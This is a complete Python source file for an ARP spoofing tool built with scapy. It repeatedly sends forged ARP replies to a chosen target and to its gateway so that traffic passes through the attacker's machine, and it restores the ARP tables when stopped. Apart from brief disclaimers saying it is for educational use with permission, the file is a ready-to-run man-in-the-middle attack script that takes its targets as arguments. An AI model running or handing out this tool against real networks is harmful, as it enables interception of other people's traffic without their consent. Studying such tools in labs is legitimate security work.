#! /usr/bin/env python

#NOTE : This code is for educational purposes only. Unauthorized use may be illegal and unethical. Always obtain permission before testing or intercepting network traffic.
#Always obtain permission before testing or intercepting network traffic.
#You have port forward the packets so the internet works properly after ARP spoofing in your victim machine.

import scapy.all as scapy
import time

def spoof(target_ip, spoof_ip):
    # Get the MAC address of the target
    target_mac = get_mac(target_ip)
    if not target_mac:
        print(f"[-] Could not find MAC address for {target_ip}... Exiting.")
        return

    # Create the ARP response packet
    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    
    # Send the packet
    scapy.send(arp_response, verbose=False)
    print(f"\r[+] Sent to {target_ip}: {spoof_ip} is-at {target_mac}",end='')

def get_mac(ip):
    # Create an ARP request to get the MAC address for the given IP
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        return None

def restore(destination_ip, source_ip):
    # Get the MAC addresses
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    if not destination_mac or not source_mac:
        print(f"[-] Could not find MAC address for {destination_ip} or {source_ip}. Exiting.")
        return

    # Create the ARP response packet to restore the correct mapping
    arp_response = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    
    # Send the packet
    scapy.send(arp_response, count=4, verbose=False)
    print(f"[+] Restored: {source_ip} is-at {source_mac} to {destination_ip}")
    print(f"[+] Restored: {destination_ip} is-at {destination_mac} to {source_ip}")
    print(f"[+] Sent to {destination_ip}: {source_ip} is-at {source_mac}")
    print(f"[+] Sent to {source_ip}: {destination_ip} is-at {destination_mac}")
    print("[+] ARP tables restored. Exiting.")
    print("[+] Exiting.")

def main():
    import argparse

    parser = argparse.ArgumentParser(description="ARP spoofing tool (for educational use only).")
    parser.add_argument("-t","--target", help="Target IP to poison")
    parser.add_argument("-g","--gateway", help="Gateway IP (usually the router)")
    parser.add_argument("-i", "--interval", type=float, default=2.0, help="Seconds between packets (default: 2.0)")
    args = parser.parse_args()

    target_ip = args.target
    gateway_ip = args.gateway
    packet_count = 0

    print("[*] Starting ARP spoofing. Press Ctrl+C to stop.")
    try:
        while True:
            spoof(target_ip, gateway_ip)  # Tell the target that we are the gateway
            spoof(gateway_ip, target_ip)  # Tell the gateway that we are the target
            packet_count += 2
            print(f"\r[+] Packets sent: {packet_count}", end='')
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[!] Detected CTRL+C ! Restoring the network, please wait...")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print("[+] Done. Exiting.")


if __name__ == '__main__':
    main()